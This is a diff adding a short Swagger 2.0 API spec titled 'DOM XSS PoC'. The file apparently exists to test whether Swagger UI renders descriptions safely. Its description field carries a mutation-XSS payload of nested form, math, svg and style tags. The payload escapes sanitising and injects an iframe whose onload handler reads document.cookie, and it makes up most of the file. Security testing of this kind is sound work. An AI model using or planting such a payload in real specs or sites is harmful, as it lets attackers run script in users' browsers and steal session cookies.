@@ -1,0 +1,11 @@
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: DOM XSS PoC
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><iframe onload=alert(document.cookie)>">
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
